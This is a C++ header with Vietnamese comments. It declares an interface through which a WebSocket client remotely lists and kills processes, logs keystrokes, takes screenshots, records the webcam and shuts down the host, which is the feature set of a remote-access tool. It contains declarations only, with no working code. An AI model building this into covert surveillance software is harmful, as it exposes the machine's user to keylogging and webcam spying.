#pragma once

#include <string>
#include <vector>
#include <cstdint>

// ICommandExecutor:
// Lớp này sẽ được WebSocket session sử dụng để thực thi các command
// nhận từ client. Mỗi hàm tương ứng với một loại command trong protocol.md.

class ICommandExecutor {
public:
    virtual ~ICommandExecutor() {}

    // ===========================
    // 1. PROCESS CONTROL
    // ===========================
    // Trả về danh sách process dưới dạng JSON string
    // Ví dụ:
    // [
    //   {"pid":1234,"name":"notepad.exe","path":"C:/Windows/notepad.exe"},
    //   ...
    // ]
    virtual std::string ListProcess() = 0;

    // Start process theo tên hoặc path.
    // Trả về true nếu start thành công, false nếu lỗi (không tìm thấy, v.v.)
    virtual bool StartProcess(const std::string& nameOrPath) = 0;

    // Dừng process theo tên hoặc PID (tùy bạn quy ước trong protocol).
    virtual bool StopProcess(const std::string& nameOrPid) = 0;


    // ===========================
    // 2. APPLICATION CONTROL
    // ===========================
    // Tương tự ListProcess nhưng chỉ liệt kê các "ứng dụng" user-level
    // (hoặc những app bạn định nghĩa trước).
    virtual std::string ListApplication() = 0;

    virtual bool StartApplication(const std::string& appName) = 0;

    virtual bool StopApplication(const std::string& appName) = 0;


    // ===========================
    // 3. KEYLOGGER (HỌC THUẬT)
    // ===========================
    virtual void StartKeyLogging() = 0;

    virtual void StopKeyLogging() = 0;

    // Trả về các phím đã log (ví dụ chuỗi text); có thể clear buffer sau khi trả.
    virtual std::string GetLoggedKeys() = 0;


    // ===========================
    // 4. SCREENSHOT
    // ===========================
    // Chụp màn hình, trả về dữ liệu ảnh (PNG/JPEG) dạng byte array.
    // Layer phía trên sẽ encode sang Base64 và gửi cho client.
    virtual std::vector<std::uint8_t> CaptureScreen() = 0;


    // ===========================
    // 5. WEBCAM
    // ===========================
    // Quay webcam trong "durationSeconds" giây, trả về dữ liệu video
    // dạng byte array (hoặc có thể đổi sang trả về file path).
    virtual std::vector<std::uint8_t> CaptureWebcam(int durationSeconds) = 0;


    // ===========================
    // 6. SYSTEM CONTROL
    // ===========================
    virtual bool Shutdown() = 0;

    virtual bool Restart() = 0;
};
